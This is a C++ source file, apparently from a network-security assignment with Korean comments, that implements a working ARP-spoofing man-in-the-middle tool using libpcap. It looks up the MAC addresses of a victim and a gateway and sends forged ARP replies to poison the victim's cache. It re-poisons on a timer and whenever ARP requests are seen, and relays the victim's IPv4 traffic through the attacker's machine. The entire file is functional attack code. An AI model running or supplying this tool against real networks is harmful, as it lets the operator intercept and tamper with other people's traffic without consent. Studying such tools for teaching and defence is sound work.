#include <cstdio>
#include <string>
#include <iostream>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include <unistd.h>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>


#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct sender_target_flow final {
	Ip sip, tip;
	Mac smac, tmac;
};

#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

using namespace std;

bool send_arp_request(pcap_t* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac);
bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr);
bool arp_infection(pcap_t* dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip);
bool arp_relay(pcap_t* dev, Mac attack_mac, Mac sender_mac,Mac target_mac, Ip sender_ip, Ip target_ip);

mutex pcap_mutex;
atomic<bool> running = true;

int main(int argc, char *argv[]) {
    if ((argc & 1) || (argc < 4)) {
        usage();
        return false;
    }
    string interface = argv[1];
    Mac attacker_mac{};
    Ip  attacker_ip{};

    if (!getMacIpAddr(interface, attacker_mac, attacker_ip)) {
        return EXIT_FAILURE;
    }

    vector<sender_target_flow> flows;
    char errbuf[PCAP_ERRBUF_SIZE];

    //packet snap length를 기존 BUFSIZ(8192)에서 65536으로 증가시켜 큰 패킷도 감지
    //cpu에 부하 걸리면 to_ms 수치를 높여도 괜찮음
    pcap_t* pcap = pcap_open_live(interface.c_str(), 65536, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface.c_str(), errbuf);
        return EXIT_FAILURE;
    }

    for (int i = 2; i < argc; i += 2) { //check format x.x.x.x
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);

        //send arp request
        Mac sender_mac = Mac::nullMac();
        Mac target_mac = Mac::nullMac();
        //get sender mac addr
        if (!send_arp_request(pcap, attacker_mac, attacker_ip,
            sender_ip, sender_mac)) {
            cout << "Failed to get mac addr" << string(sender_ip) << '\n';
            return false;
            }
        //get target mac addr
        if (!send_arp_request(pcap, attacker_mac, attacker_ip,
            target_ip, target_mac)) {
            cout << "Failed to get mac addr" << string(sender_ip) << '\n';
            return false;
            }
	
        flows.push_back(sender_target_flow{sender_ip, target_ip, sender_mac, target_mac});
        cout << string(flows[(i-2)/2].smac) << ", " << string(flows[(i - 2) / 2].tmac) << endl;
    }

    //cout << string(flows[0].sender) << endl;

    vector<thread> threads;

    for (int i = 0; i < flows.size(); i++) {
        //send arp reply to infect
        //sender = victim , target = gateway
        if (!arp_infection(pcap, attacker_mac, flows[i].smac,
            flows[i].sip, flows[i].tip)) {
            cout << "Failed ARP infection\n";
            return false;
        }

        //start relay
        //sender = victim , target = gateway
        //thread

        threads.push_back(thread([&, i](){
                // sender→target capture
                pcap_t* thread_pcap = pcap_open_live(interface.c_str(), 65536, 1, 1, errbuf);
                arp_relay(thread_pcap, attacker_mac, flows[i].smac, flows[i].tmac,
                flows[i].sip, flows[i].tip);
                pcap_close(thread_pcap);
        }));

        //auto infect
        threads.push_back(thread([&, i](){
                // sender→target capture
                    while (running.load()) {
                        if (!arp_infection(pcap, attacker_mac, flows[i].smac,
                    flows[i].sip, flows[i].tip)) {
                            cout << "Failed ARP infection\n";
                            running.store(false);
                            return;
                    }
                this_thread::sleep_for(chrono::seconds(30));
                }

        }));
    }


    cout << "Press key to stop" << "\n";

    std::thread input_th([&]() {
        char c;
        std::cin.get(c);
        running.store(false);
    });

    input_th.join();

    cout << "Ending process..." << endl;

    for (auto& t : threads)  //exit thread
    {
        if (t.joinable())
            t.join();
    }

    pcap_close(pcap);
    cout << "Done" << endl;
    return EXIT_SUCCESS;
}

bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return false;
    }
    struct ifreq ifr {};
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl(failed to get mac addr)");
        close(fd);
        return false;
    }
    Mac mac(reinterpret_cast<const uint8_t*>(ifr.ifr_hwaddr.sa_data));
    mac_addr = mac;

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl(failed to get ip addr)");
        close(fd);
        return false;
    }
    Ip ip_tmp(ntohl(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr));
    ip_addr = ip_tmp;

    close(fd);
    return true;
}

bool send_arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip, Mac& target_mac) {

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = Mac(string(my_mac));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(string(my_mac));
    packet.arp_.sip_ = htonl(static_cast<uint32_t>(my_ip));
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
    {
        std::lock_guard<std::mutex> lk(pcap_mutex);
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return false;
        }
    }

    struct pcap_pkthdr* header;
    const uint8_t* recv_pkt;
    int res_recv;
    EthArpPacket pkt;

    while (true) {
        res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
        if (res_recv == 0) continue;
	    if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
            break;
        }

        memcpy(&pkt, recv_pkt, sizeof(EthArpPacket));
	    if (ntohs(pkt.eth_.type_) != EthHdr::Arp) continue;
	    if (ntohs(pkt.arp_.op_) != ArpHdr::Reply) continue;
	    if (ntohl(pkt.arp_.sip_) != target_ip) continue;
	    break;
    }

    Mac target_mac_tmp = pkt.arp_.smac_;
    target_mac = target_mac_tmp;

    return true;
}

bool arp_infection(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {

    EthArpPacket packet{};

    packet.eth_.dmac_ = Mac(string(sender_mac));
    packet.eth_.smac_ = Mac(string(attack_mac));
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    //sender
    packet.arp_.smac_ = Mac(string(attack_mac));
    packet.arp_.sip_ = htonl(target_ip);
    //target
    packet.arp_.tmac_ = Mac(string(sender_mac));
    packet.arp_.tip_ = htonl(sender_ip);

    {
        std::lock_guard<std::mutex> lk(pcap_mutex);
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return false;
        }
    }
    return true;

}

bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip sender_ip, Ip target_ip) {

    EthArpPacket pkt;
    struct pcap_pkthdr* header;

    const uint8_t* recv_pkt;
    long long len = 0;

    while (running) {
        {
            int res_recv = pcap_next_ex(pcap, &header, &recv_pkt);
            if (res_recv == 0) continue;
            if (res_recv == PCAP_ERROR || res_recv == PCAP_ERROR_BREAK) {
                break;
            }
        }
        EthHdr* ethhdr =(EthHdr*)recv_pkt;

        if (ethhdr->type() == EthHdr::Arp) {
            ArpHdr* arp_pkt = (ArpHdr*)(recv_pkt + sizeof(EthHdr));
            //sender -> taregt or target -> sender ARP request (broadcast)
            //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl
            if ((ethhdr->smac() == target_mac) && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                    cout << "Failed ARP infection\n";
                        return false;
                    }
                cout << "case 1 infected\n";
            }
            //sender -> target(attack spoofed) unicast
            else if (ethhdr->smac() == sender_mac && ethhdr->dmac() == attack_mac && arp_pkt->op() == ArpHdr::Request ) {
                if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                    cout << "Failed ARP infection\n";
                    return false;
                }
                cout << "case 2 infected\n";
            }
        }
        else if (ethhdr->type() == EthHdr::Ip4) {
            // IPv4 패킷 처리 (sender → target 만 relay)
            len = header->caplen;
            auto buf = make_unique<u_char[]>(len); //동적 할당
            memcpy(buf.get(), recv_pkt, len);

            EthHdr* eth = reinterpret_cast<EthHdr*>(buf.get());
            if ((eth->smac() == sender_mac && eth->dmac() == attack_mac)) //sender send, ip 조건 추가해야함
            {
                eth->smac_ = attack_mac;
                eth->dmac_ = target_mac;
                {
                    int res = pcap_sendpacket(pcap, buf.get(), len);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket failed: %d (%s)\n", res, pcap_geterr(pcap));
                        return false;
                    }
                }
            }
        }
    }
    return true;
}
